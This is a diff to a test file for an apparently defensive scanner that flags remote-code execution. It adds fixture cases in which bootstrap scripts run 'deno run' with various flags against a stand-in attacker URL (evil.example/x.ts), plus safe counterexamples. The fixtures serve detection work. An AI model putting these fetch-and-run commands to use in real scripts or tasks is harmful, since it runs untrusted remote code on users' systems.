@@ -41,6 +41,30 @@ const RUNNERS: Record<string, { path: string; body: string }> = {
     path: "scripts/bootstrap.sh",
     body: "deno run --unstable https://evil.example/x.ts",
   },
+  "deno run -N URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run -N https://evil.example/x.ts",
+  },
+  "deno run -N with a host list URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run -N=evil.example https://evil.example/x.ts",
+  },
+  "deno run --allow-import then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --allow-import --allow-net https://evil.example/x.ts",
+  },
+  "deno run -q then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run -q --allow-net https://evil.example/x.ts",
+  },
+  "deno run --no-check then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --no-check --allow-net https://evil.example/x.ts",
+  },
+  "deno run --reload then --allow-net URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --reload --allow-net https://evil.example/x.ts",
+  },
   "deno run --allow-net URL in a deno.json task": {
     path: "deno.json",
     body: '{"tasks":{"setup":"deno run --allow-net https://evil.example/x.ts"}}',
@@ -125,6 +149,14 @@ test("running local or registry content keeps no unsafe-execution finding", () =
     {
       path: "scripts/bootstrap.sh",
       body: "deno run --help https://example.com/module.ts",
+    },
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run -N ./local.ts https://api.example/data",
+    },
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --no-check --no-remote https://example.com/module.ts",
     },
     {
       path: "scripts/bootstrap.sh",
